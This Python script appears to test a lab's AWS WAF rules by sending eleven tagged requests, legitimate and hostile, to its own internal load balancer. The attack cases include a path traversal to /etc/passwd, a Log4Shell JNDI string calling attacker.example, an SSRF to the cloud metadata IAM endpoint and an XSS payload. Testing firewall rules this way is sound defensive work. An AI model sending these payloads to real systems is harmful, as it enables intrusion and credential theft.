# Sends 11 test requests to the internal ALB and returns the HTTP status of each.
# Every request carries an X-Lab-Case header so you can find it in the WAF logs.
# The "attack" cases are harmless strings sent only to the lab's own echo function.
# http.client sends no User-Agent unless you set one, which the no-UA cases rely on.
import http.client
import os

HOST = os.environ["ALB_DNS"]
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/130.0 waf-lab"}
JSON = dict(UA, **{"Content-Type": "application/json"})

# About 12 KB of JSON: over the 8 KB SizeRestrictions_BODY threshold.
BIG = '{"title":"Q3 report","rows":[' + ",".join(
    '{"id":%d,"note":"quarterly figures for region"}' % i for i in range(300)
) + "]}"

# A CMS save that embeds a third-party widget script.
CMS = ('{"page":"about","html":"<p>Visit our new office</p>'
       '<script src=https://cdn.example.com/map-widget.js></script>"}')

CASES = [
    # Legitimate traffic
    ("legit-home", "GET", "/", UA, None),
    ("legit-upload-12kb", "POST", "/api/reports", JSON, BIG),
    ("legit-healthcheck-no-ua", "GET", "/health", {}, None),
    ("legit-cms-save", "POST", "/cms/pages", JSON, CMS),
    # Attack patterns
    ("attack-lfi", "GET", "/download?file=../../../../etc/passwd", UA, None),
    ("attack-log4j", "GET", "/", dict(UA, **{"X-Api-Version": "${jndi:ldap://attacker.example/a}"}), None),
    ("attack-ssrf", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/", UA, None),
    ("attack-xss", "GET", "/search?q=<script>alert(1)</script>", UA, None),
    # Probes: the same content on paths that should NOT get an exception
    ("negative-xss-body-comments", "POST", "/api/comments", JSON, CMS),
    ("negative-no-ua-admin", "GET", "/admin", {}, None),
    ("negative-12kb-comments", "POST", "/api/comments", JSON, BIG),
]


def send(case):
    name, method, path, headers, body = case
    conn = http.client.HTTPConnection(HOST, 80, timeout=5)
    conn.request(method, path, body=body, headers=dict(headers, **{"X-Lab-Case": name}))
    resp = conn.getresponse()
    resp.read()
    conn.close()
    return "%s -> %d" % (name, resp.status)


def handler(event, context):
    repeat = int(event.get("repeat", 1)) if isinstance(event, dict) else 1
    return [send(c) for _ in range(repeat) for c in CASES]
